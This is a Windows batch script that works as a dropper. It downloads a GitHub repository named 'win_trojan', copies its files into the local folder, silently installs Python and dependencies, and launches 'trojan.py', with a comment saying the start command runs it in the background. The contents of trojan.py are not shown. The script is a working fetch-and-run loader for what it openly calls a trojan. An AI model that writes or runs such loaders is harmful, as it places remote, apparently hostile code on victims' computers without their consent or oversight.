@echo off
SETLOCAL EnableDelayedExpansion

:: --- Configuration ---
SET "REPO_URL=https://github.com/Noah-school/win_trojan/archive/refs/heads/main.zip"
SET "ZIP_FILE=%TEMP%\win_trojan_dl.zip"
SET "TEMP_EXTRACT=%TEMP%\win_trojan_temp"
:: Use 'python' but we will re-verify the path after install
SET "PYTHON_EXE=python"

:: Ensure we are working in the directory where the .bat file is located
cd /d "%~dp0"

echo [*] Target Directory: %CD%

:: 1. Download the repository
echo [*] Downloading files...
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%REPO_URL%' -OutFile '%ZIP_FILE%'"
if %ERRORLEVEL% neq 0 (
    echo [!] Download failed. Check your internet connection.
    pause
    exit /b
)

:: 2. Extract to a TEMP folder
echo [*] Extracting...
if exist "%TEMP_EXTRACT%" rd /S /Q "%TEMP_EXTRACT%"
powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%TEMP_EXTRACT%' -Force"

:: 3. Move files and ensure we are in the right folder
:: The GitHub zip contains a subfolder like 'win_trojan-main'
echo [*] Moving files to %CD%...
xcopy "%TEMP_EXTRACT%\win_trojan-main\*" "." /E /H /Y /Q

:: 4. Cleanup Zip and Temp Folder
echo [*] Cleaning up...
rd /S /Q "%TEMP_EXTRACT%"
del "%ZIP_FILE%"

:: 5. Python Check and Install
%PYTHON_EXE% --version >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [!] Python not found. Installing...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe' -OutFile '%TEMP%\py_inst.exe'"
    start /wait %TEMP%\py_inst.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    del %TEMP%\py_inst.exe
    
    :: Force update the PATH for the current CMD session
    SET "PATH=%PATH%;%ProgramFiles%\Python311\;%ProgramFiles%\Python311\Scripts\;%LocalAppData%\Programs\Python\Python311\;%LocalAppData%\Programs\Python\Python311\Scripts\"
)

:: 6. Verify Python works now
%PYTHON_EXE% --version >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [!] Python installation failed or not in PATH. Please restart the script.
    pause
    exit /b
)

:: 7. Install Dependencies
if exist "requirements.txt" (
    echo [*] Installing requirements...
    %PYTHON_EXE% -m pip install --upgrade pip
    %PYTHON_EXE% -m pip install -r requirements.txt
)

:: 8. Run the Script with explicit path check
if exist "trojan.py" (
    echo [*] Success. Launching trojan.py...
    :: Use 'start' to run in background, or call it directly to see errors
    start "" %PYTHON_EXE% "%CD%\trojan.py"
) else (
    echo [!] Error: trojan.py not found.
    echo Current files in directory:
    dir /B
    pause
)

exit
